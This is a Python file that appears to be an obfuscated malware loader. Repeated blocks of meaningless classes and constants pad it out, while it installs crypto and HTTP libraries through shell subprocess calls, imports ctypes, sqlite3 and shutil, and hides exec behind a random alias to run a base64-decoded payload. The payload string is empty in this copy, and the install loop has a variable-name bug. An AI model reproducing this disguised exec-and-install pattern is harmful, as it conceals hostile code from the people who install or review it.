

from sys import executable, stderr
RZGFIcZchu = 70751564
W4ghSsqOlr = 7179013
IMSPcbGPwM = 83375869
fp27qvUP8I = 21214540
Pfky4P8X7a = 35612347
fqUZV3QUoQ = 91519870
class B0AkluPcSC:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
qhXgSxHjvw = 25727359
class bPik5b3Pwr:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
cFOH53ry6S = 30640755
class DFq45hFHUi:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class qISHttxoEj:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
kCiKoSR3Hm = 91532373
class pbkutxVtMe:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class Lb7GB1BYOB:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class Ra16N3EsGo:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'f7LgNrj', 'age': 73}
class aN5vNWmhuo:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
NmIxuhO1ri = 81965797
'gfiiMzbpKm'
class HNyJDEQ4De:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class TBEvVdaKEm:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
["'Y4romiB91K'", "'KMHsxb794L'"]
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
from importlib import import_module

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
]
for modl in requirements:
    try:
        import_module(module[0])
    except:
        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
        time.sleep(3)
        

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptodomex", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
    from Crypto.Cipher import AES

import requests
RZGFIcZchu = 70751564
W4ghSsqOlr = 7179013
IMSPcbGPwM = 83375869
fp27qvUP8I = 21214540
Pfky4P8X7a = 35612347
fqUZV3QUoQ = 91519870
class B0AkluPcSC:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
qhXgSxHjvw = 25727359
class bPik5b3Pwr:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
cFOH53ry6S = 30640755
class DFq45hFHUi:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class qISHttxoEj:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
kCiKoSR3Hm = 91532373
class pbkutxVtMe:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class Lb7GB1BYOB:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class Ra16N3EsGo:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'f7LgNrj', 'age': 73}
class aN5vNWmhuo:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
NmIxuhO1ri = 81965797
'gfiiMzbpKm'
class HNyJDEQ4De:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class TBEvVdaKEm:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
["'Y4romiB91K'", "'KMHsxb794L'"]
l4bssLqDNtPTFfXSTnoTCXQ8MRNRnutVFYafee = exec
RZGFIcZchu = 70751564
W4ghSsqOlr = 7179013
IMSPcbGPwM = 83375869
fp27qvUP8I = 21214540
Pfky4P8X7a = 35612347
fqUZV3QUoQ = 91519870
class B0AkluPcSC:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
qhXgSxHjvw = 25727359
class bPik5b3Pwr:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
cFOH53ry6S = 30640755
class DFq45hFHUi:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class qISHttxoEj:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
kCiKoSR3Hm = 91532373
class pbkutxVtMe:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class Lb7GB1BYOB:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class Ra16N3EsGo:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'f7LgNrj', 'age': 73}
class aN5vNWmhuo:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
NmIxuhO1ri = 81965797
'gfiiMzbpKm'
class HNyJDEQ4De:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class TBEvVdaKEm:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
["'Y4romiB91K'", "'KMHsxb794L'"]
import concurrent.futures
PUGpAwdxSnkcsOsIiMdYFqEix8fSGlycoRCpL6=""
l4bssLqDNtPTFfXSTnoTCXQ8MRNRnutVFYafee(base64.b64decode(PUGpAwdxSnkcsOsIiMdYFqEix8fSGlycoRCpL6))
RZGFIcZchu = 70751564
W4ghSsqOlr = 7179013
IMSPcbGPwM = 83375869
fp27qvUP8I = 21214540
Pfky4P8X7a = 35612347
fqUZV3QUoQ = 91519870
class B0AkluPcSC:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
qhXgSxHjvw = 25727359
class bPik5b3Pwr:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
cFOH53ry6S = 30640755
class DFq45hFHUi:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class qISHttxoEj:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
kCiKoSR3Hm = 91532373
class pbkutxVtMe:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class Lb7GB1BYOB:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class Ra16N3EsGo:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'f7LgNrj', 'age': 73}
class aN5vNWmhuo:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
NmIxuhO1ri = 81965797
'gfiiMzbpKm'
class HNyJDEQ4De:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class TBEvVdaKEm:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
["'Y4romiB91K'", "'KMHsxb794L'"]
